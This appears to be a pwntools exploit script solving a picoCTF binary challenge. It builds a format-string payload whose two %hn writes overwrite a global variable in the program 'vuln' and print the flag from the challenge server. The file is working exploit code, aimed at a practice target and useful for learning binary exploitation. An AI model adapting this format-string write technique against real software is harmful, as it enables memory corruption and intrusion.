#!/usr/bin/env python3

from pwn import *
import math

exe = ELF("./vuln")

context.binary = exe

def conn():
    if args.LOCAL:
        # r = gdb.debug([exe.path])
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 59762)

    return r

def main():
    r = conn()

    arg_offset = 13

    # We set this (ensuring that the first part of the payload will fit) so that 
    # we know the argument numbers to specify for each %hn so that the address can be plucked off the stack
    max_fmtspcfer_len = 32

    addr_to_overwrite = 0x404060
    first_short = 0x6c66 # Write to 0x404060
    scnd_short = 0x6761 # Write to 0x404062

    # Notice that we are flipping the order i.e. the first %hn will write to 0x404062
    # and the second %hn will write to 0x404060 because the value to be written to 0x404062 is smaller
    payload = b''
    payload += b'%'+str(scnd_short).encode()+b'c'
    payload += b'%'+str(arg_offset + max_fmtspcfer_len//8 + 1).encode()+b'$hn'
    payload += b'%'+str(first_short-scnd_short).encode()+b'c'
    payload += b'%'+str(arg_offset + max_fmtspcfer_len//8 + 2).encode()+b'$hn'

    payload = payload.ljust(max_fmtspcfer_len, b'A')

    payload += p64(0x404062)
    payload += p64(0x404060)

    log.info(f"{payload=}")

    r.sendlineafter(b'say?\n', payload)

    # Clear output
    r.recvuntil(b'go...\n')

    print(r.recvuntil(b'}'))

if __name__ == "__main__":
    main()
